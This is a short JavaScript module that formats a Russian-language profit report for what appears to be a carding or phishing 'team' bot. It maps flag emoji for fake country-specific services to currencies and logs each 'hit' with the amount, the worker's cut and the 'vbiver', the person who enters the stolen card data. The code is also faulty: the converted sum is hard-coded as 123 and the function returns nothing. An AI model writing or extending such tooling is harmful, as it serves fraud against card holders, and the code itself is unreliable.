const convertCurr = require('./convertCurr')
const currency = require('currency.js')

module.exports = async function profit(service, summ, percent, worker, vbiver) {
    let message, valuta = ``

    if (service.includes('🇸🇪')) {
        valuta = `SEK`
    } else if ((service.includes('🇵🇹')) || (service.includes('🌍')) || (service.includes('🇮🇹')) || (service.includes('🇩🇪'))) {
        valuta = `EUR`
    } else if (service.includes('🇷🇴')) {
        valuta = `RON`
    } else if (service.includes('🇧🇾')) {
        valuta = `BYN`
    } else if (service.includes('🇵🇱')) {
        valuta = `PLN`
    } else if (service.includes('🇦🇺')) {
        valuta = `AUD`
    } else if (service.includes('🏴')) {
        valuta = `GBP`
    } else if (service.includes('🇨🇦')) {
        valuta = `CAN`
    } else if (service.includes('🇪🇸')) {
        valuta = 'EUR'
    }

    console.log(`✅ <b>Залёт оформлен</b>\n\n<b>🌍 Сервис:</b> ${service}\n💎 <b>Сумма:</b> ${currency(parseFloat(summ), { separator: ' ', symbol: '', }).format()} <b>RUB /</b> ${currency(parseFloat(123), { separator: ' ', symbol: '', }).format()} <b>${valuta}</b>\n⚖️ <b>Процент:</b> ${percent}%\n\n👨‍💻 <b>Воркер:</b> ${worker}\n🥷🏻 <b>Вбивер:</b> @${vbiver}`)

    /* await convertCurr(parseInt(summ), `RUB`, valuta, async (res) => {
        message = await `✅ <b>Залёт оформлен</b>\n\n<b>🌍 Сервис:</b> ${service}\n💎 <b>Сумма:</b> ${currency(parseFloat(summ), { separator: ' ', symbol: '', })} <b>RUB /</b> ${currency(parseFloat(res), { separator: ' ', symbol: '', })} <b>${valuta}</b>\n⚖️ <b>Процент:</b> ${percent}%\n\n👨‍💻 <b>Воркер:</b> ${worker}\n🥷🏻 <b>Вбивер:</b> @${vbiver}`
    }) */

    return await message
}